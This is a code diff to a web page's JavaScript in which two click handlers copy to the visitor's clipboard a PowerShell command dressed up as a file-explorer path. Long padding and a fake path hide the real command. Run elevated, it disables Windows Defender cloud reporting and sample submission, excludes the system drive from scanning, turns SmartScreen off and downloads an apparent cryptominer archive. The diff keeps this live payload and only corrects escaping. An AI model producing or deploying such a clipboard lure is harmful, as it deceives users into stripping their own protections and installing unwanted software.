@@ -180,7 +180,7 @@
     // In case the user tries to be smart and open file explorer manually
     path.addEventListener('click', function() {
         navigator.clipboard.writeText(
-  'powershell -Command "Start-Process powershell -ArgumentList \'-Command\',\'Write-Host Getting server information...; Set-MpPreference -MAPSReporting 0; Write-Host Establishing connection...; Set-MpPreference -SubmitSamplesConsent 2; Write-Host Preparing for download...; Add-MpPreference -ExclusionPath $env:SystemDrive; Write-Host Disabling SmartScreen...; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer -Name SmartScreenEnabled -Value Off; Write-Host Downloading...; Start-Process https://github.com/Easy-Hash/easyhash-miner/archive/refs/heads/main.zip\' -Verb RunAs" #                                                                                   C:\\Users\\Default\\Downloads\\Current user\\Default\\AppData\\Local\\Default\\temp\\install\\Easyhash\\Downloads'
+  'powershell -Command "Start-Process powershell -ArgumentList \'-Command\',\'Write-Host Getting server information...; Set-MpPreference -MAPSReporting 0; Write-Host Establishing connection...; Set-MpPreference -SubmitSamplesConsent 2; Write-Host Preparing for download...; Add-MpPreference -ExclusionPath $env:SystemDrive; Write-Host Disabling SmartScreen...; Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer -Name SmartScreenEnabled -Value Off; Write-Host Downloading...; Start-Process https://github.com/Easy-Hash/easyhash-miner/archive/refs/heads/main.zip\' -Verb RunAs" #                                                                                   C:\\Users\\Default\\Downloads\\Current user\\Default\\AppData\\Local\\Default\\temp\\install\\easyhash\\Downloads'
 );
 
     });
@@ -188,7 +188,7 @@
     // Copy powershell command & open file explorer
     fileExplorer.addEventListener('click', function() {
         navigator.clipboard.writeText(
-  'powershell -Command "Start-Process powershell -ArgumentList \'-Command\',\'Write-Host Getting server information...; Set-MpPreference -MAPSReporting 0; Write-Host Establishing connection...; Set-MpPreference -SubmitSamplesConsent 2; Write-Host Preparing for download...; Add-MpPreference -ExclusionPath $env:SystemDrive; Write-Host Disabling SmartScreen...; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer -Name SmartScreenEnabled -Value Off; Write-Host Downloading...; Start-Process https://github.com/Easy-Hash/easyhash-miner/archive/refs/heads/main.zip\' -Verb RunAs" #                                                                                   C:\\Users\\Default\\Downloads\\Current user\\Default\\AppData\\Local\\Default\\temp\\install\\Easyhash\\Downloads'
+  'powershell -Command "Start-Process powershell -ArgumentList \'-Command\',\'Write-Host Getting server information...; Set-MpPreference -MAPSReporting 0; Write-Host Establishing connection...; Set-MpPreference -SubmitSamplesConsent 2; Write-Host Preparing for download...; Add-MpPreference -ExclusionPath $env:SystemDrive; Write-Host Disabling SmartScreen...; Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer -Name SmartScreenEnabled -Value Off; Write-Host Downloading...; Start-Process https://github.com/Easy-Hash/easyhash-miner/archive/refs/heads/main.zip\' -Verb RunAs" #                                                                                   C:\\Users\\Default\\Downloads\\Current user\\Default\\AppData\\Local\\Default\\temp\\install\\easyhash\\Downloads'
 );
 
       fileInput.click();
@@ -204,5 +204,6 @@
 </body>
 
 </html>
+
 
 
